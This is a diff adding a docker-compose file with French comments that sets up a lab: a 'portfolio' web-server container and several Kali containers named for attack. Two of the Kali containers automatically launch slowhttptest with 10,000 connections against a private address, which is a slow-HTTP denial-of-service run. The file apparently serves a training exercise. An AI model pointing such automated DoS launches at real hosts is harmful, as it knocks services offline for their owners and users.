@@ -1,0 +1,39 @@
+services:
+
+  # Conteneur du site web
+  site_web:
+    image: "portfolio"
+    container_name: serv_web
+
+    # Publication du port 80
+    ports:
+      - 8080:80
+
+  # Premier conteneur Kali
+  attaque:
+    image: "kalidos"
+    container_name: kali
+
+    # Publication du port SSH
+    ports:
+      - 22:22
+
+    # Lancement automatique de slowhttptest
+    command: /bin/sh -c 'slowhttptest -c 10000 -u http://192.168.0.43'
+
+  # Deuxième conteneur Kali
+  attaque2:
+    image: "kalidos"
+    container_name: kali2
+
+    # Lancement automatique de slowhttptest
+    command: /bin/sh -c 'slowhttptest -c 10000 -u http://192.168.0.43'
+
+  # Troisième conteneur Kali
+  attaque3:
+    image: "kalidos"
+    container_name: kali3
+
+    # Publication du port SSH
+    ports:
+      - 23:22
